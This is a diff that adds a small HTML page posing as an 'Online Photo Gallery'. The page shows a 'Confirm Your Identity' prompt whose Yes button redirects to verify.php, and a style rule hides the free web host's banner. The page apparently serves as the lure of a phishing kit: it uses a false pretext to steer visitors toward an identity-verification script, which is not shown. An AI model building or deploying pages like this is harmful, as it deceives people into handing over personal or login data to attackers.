@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Bootstrap Example</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <style>
+.w3-button {width:150px;}
+img[alt="www.000webhost.com"]{display:none;}
+</style>
+</head>
+<body>
+ 
+<div class="container">
+  <h2 align="center">Online Photo Gallery</h2>
+  <hr>
+  <div class="panel panel-default">
+    <div align="center" class="panel-heading"><font color="black"><b>Confirm Your Identity</b></font></div>
+    <div class="panel-body">
+      To see the next images you have to confirm your identity. Do you want to continue?<br>
+      <button class="w3-button w3-red">No</button>
+       <button id="yp" class="w3-button w3-light-green">Yes</button>
+    </div>
+  </div>
+</div>
+
+
+<script type="text/javascript">
+    document.getElementById("yp").onclick = function () {
+        location.href = "verify.php?code=verifyid";
+    };
+</script>
+
+</body>
+</html>
